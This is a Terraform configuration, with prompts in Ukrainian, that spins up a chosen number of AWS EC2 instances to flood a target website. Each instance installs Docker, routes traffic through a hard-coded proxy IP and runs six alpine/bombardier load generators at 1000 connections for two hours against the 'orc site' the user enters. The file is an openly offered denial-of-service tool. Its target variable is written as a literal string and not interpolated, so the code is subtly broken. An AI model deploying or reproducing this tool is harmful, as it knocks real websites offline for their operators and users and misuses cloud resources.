provider "aws" {
    region = "us-east-2"
    access_key = var.aws_key_access
    secret_key = var.aws_key_secret 
}
variable "aws_key_access" {
  description = "Acces key - введи зара:"
  type = string
}
variable "aws_key_secret" {
  description = "Secret key - введи зара:"
  type = string
}

data "aws_ami" "ubuntu" {

    most_recent = true

    filter {
        name   = "name"
        values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
    }

    filter {
        name = "virtualization-type"
        values = ["hvm"]
    }

    owners = ["099720109477"]
}

variable "link_ddos" {
  description = "Ціль атаки - або введи сайт орків:"
  type = string
}


variable "kozaks" {
  description = "Скільки козаків пустити вбій(к-сть інстансів)"
  type = number
}

resource "aws_instance" "ddos"  {
  count = var.kozaks
  ami           = data.aws_ami.ubuntu.id
  instance_type = "t2.micro"
  user_data = <<EOF
  #!/bin/bash
  sudo apt-get update -y
  sudo apt install docker.io -y
  sudo systemctl unmask docker.service
  sudo systemctl unmask docker.socket
  sudo systemctl start docker.service
  sudo systemctl start docker
  export http_proxy=http://91.221.17.220:8000
  export HTTP_PROXY=http://91.221.17.220:8000
  sudo apt-get update -y
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
EOF
}
